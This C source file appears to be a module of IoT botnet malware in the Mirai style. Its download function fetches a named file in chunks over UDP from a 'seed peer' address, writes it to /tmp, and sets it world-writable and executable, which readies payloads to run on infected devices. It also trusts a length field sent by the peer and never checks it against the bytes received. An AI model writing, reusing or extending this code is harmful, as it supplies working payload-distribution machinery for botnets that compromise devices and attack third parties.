#include "includes.h"
#include "p2pfile.h"
#include "rand.h"

void p2pfile_init(void) {
    /* Nothing to initialize - pure outbound */
}

int p2pfile_download(char *filename, ipv4_t seed_addr, port_t seed_port) {
    int fd;
    struct sockaddr_in to;
    uint8_t req[64], resp[8192];
    char path[128];
    int file_fd, total = 0, chunk = 0;
    
    /* Open output file */
    snprintf(path, sizeof(path), "/tmp/%s", filename);
    file_fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0777);
    if (file_fd == -1) return -1;
    
    /* Connect to seed peer */
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        close(file_fd);
        return -1;
    }
    
    to.sin_family = AF_INET;
    to.sin_addr.s_addr = seed_addr;
    to.sin_port = htons(seed_port);
    
    /* Request chunks until we get nothing back */
    while (TRUE) {
        /* Build request */
        req[0] = P2PFILE_REQ;
        req[1] = chunk & 0xFF;
        req[2] = (chunk >> 8) & 0xFF;
        strncpy((char *)(req + 3), filename, sizeof(req) - 3);
        
        /* Send request */
        sendto(fd, req, sizeof(req), 0, (struct sockaddr *)&to, sizeof(to));
        
        /* Wait for response */
        fd_set fdset;
        struct timeval tv;
        FD_ZERO(&fdset);
        FD_SET(fd, &fdset);
        tv.tv_sec = 2;
        tv.tv_usec = 0;
        
        if (select(fd + 1, &fdset, NULL, NULL, &tv) <= 0) {
            /* Timeout - try next seed or give up */
            break;
        }
        
        /* Receive data */
        int n = recv(fd, resp, sizeof(resp), 0);
        if (n <= 4 || resp[0] != P2PFILE_DATA) {
            break;
        }
        
        /* Write chunk */
        int chunk_len = (resp[2] << 8) | resp[3];
        write(file_fd, resp + 4, chunk_len);
        total += chunk_len;
        chunk++;
        
        /* Limit chunks */
        if (chunk > 64) break;
    }
    
    close(fd);
    close(file_fd);
    
    /* Make executable */
    chmod(path, 0777);
    
    return total > 0 ? 0 : -1;
}
